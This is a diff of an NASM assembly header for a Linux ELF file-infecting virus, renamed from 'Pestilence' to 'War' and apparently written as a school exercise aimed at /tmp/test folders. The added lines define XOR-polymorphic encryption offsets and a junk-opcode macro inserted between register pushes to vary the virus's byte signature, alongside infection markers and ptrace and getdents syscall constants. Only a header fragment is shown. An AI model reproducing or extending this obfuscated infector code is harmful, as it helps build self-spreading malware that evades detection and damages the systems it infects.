@@ -2,8 +2,13 @@
  %define HEADER_ASM
 
 %define FOLDER_1 "/tmp/test/"
+%strlen F1_LEN FOLDER_1
+
 %define FOLDER_2 "/tmp/test2/"
+%strlen F2_LEN FOLDER_2
+
 %define TMP "infected"
+%strlen TMP_LEN TMP
 
 %define FILE_SIZE 256 ; target
 %define DIRENT 32768  ; buffer for getdents
@@ -11,28 +16,21 @@
 %define ENTRY 16      ; new entry + opcode
 %define MAPPED_FILE 8 ; mmap
 
+;hash 
 %define FNV_PRIME_64 1099511628211
 %define FNV_OFFSET_64 0xcbf29ce484222325
 
-; String uint64ToString(uint64_t input) {
-;   String result = "";
-;   uint8_t base = 10;
-
-;   do {
-;     char c = input % base;
-;     input /= base;
-
-;     if (c < 10)
-;       c +='0';
-;     else
-;       c += 'A' - 10;
-;     result = c + result;
-;   } while (input);
-;   return result;
-; }
-
-%define FAMINE_SIZE _v_stop - _pestilence
+;v_size
+%define FAMINE_SIZE _v_stop - _war
+;v_encrypt
 %define CHUNKS_SIZE _v_stop - obfu
+; xorpoly
+%define XOR_POLY _v_stop - xorpoly
+%define XOR_RJ0 _v_stop - RJ0
+%define XOR_RJ1 _v_stop - RJ1
+%define XOR_RJ2 _v_stop - RJ2
+%define XOR_RJ4 _v_stop - RJ4
+
 
 ; ELF_HDR_DEFINITION
 %define ET_EXEC 0x02
@@ -56,7 +54,44 @@
 %define SYS_PTRACE 101
 %define SYS_GETDENTS 217
 
-%define SIGNATURE "Pestilence version 1.0 (c)oded by dbaffier"
+;STARTING JUNK
+;      EAX ECX EDX EBX ESP EBP ESI EDI
+;  EAX C0  C8  D0  D8  E0  E8  F0  F8
+;  ECX C1  C9  D1  D9  E1  E9  F1  F9
+;  EDX C2  CA  D2  DA  E2  EA  F2  FA
+;  EBX C3  CB  D3  DB  E3  EB  F3  FB
+;  ESP C4  CC  D4  DC  E4  EC  F4  FC
+;  EBP C5  CD  D5  DD  E5  ED  F5  FD
+;  ESI C6  CE  D6  DE  E6  EE  F6  FE
+;  EDI C7  CF  D7  DF  E7  EF  F7  FF
+
+;http://ref.x86asm.net/coder64.html
+
+%define PUSH_RAX 0x50
+%define PUSH_RSI 0x57
+%define POP_RAX 0x58
+%define POP_RSI 0x5f
+;CMP JUNK
+; push <reg>, 1.2.3.4.5.6.7
+%define PUSH_REG 0x50
+; pop <reg> 1.2.3.4.5.6.7
+%define POP_REG 0x58
+; REX.W xchg rax, rax = NOP
+;REX.W + flag + opcode 0x87 + r64 to avoid the use of 0x90:
+;REX.W + 0x90 + r64 == XCHG RAX, r64 which is 0x90
+%define NOP_0    0x48
+%define NOP_1    0x87
+%define NOP_2    0xC0
+
+; %define JUNK_INIT PUSH_RAX, PUSH_RSI, NOP_0, NOP_1, NOP_2, POP_RSI, POP_RAX
+%macro W_JUNK 0
+    db PUSH_RAX, PUSH_RSI, NOP_0, NOP_1, NOP_2, NOP_0, NOP_1, NOP_2, POP_RSI, POP_RAX
+%endmacro
+
+%define SIGNATURE "War version 1.0 (c)oded by dbaffier - AAAABBBB"
+%strlen SIG_LEN SIGNATURE
+
+%define VAR_LEN F1_LEN + F2_LEN + TMP_LEN + SIG_LEN + 3
 
 %define PAGE_SIZE 4096
 
@@ -157,15 +192,21 @@ endstruc
 %macro PUSH 0
     push rax
     push rbx
+    W_JUNK
     push rcx
+    W_JUNK
     push rdx
+    W_JUNK
     push rsi
     push rdi
     push rbp
+    W_JUNK
     push rsp
     push r8
+    W_JUNK
     push r9
     push r10
+    W_JUNK
     push r11
     push r12
     push r13
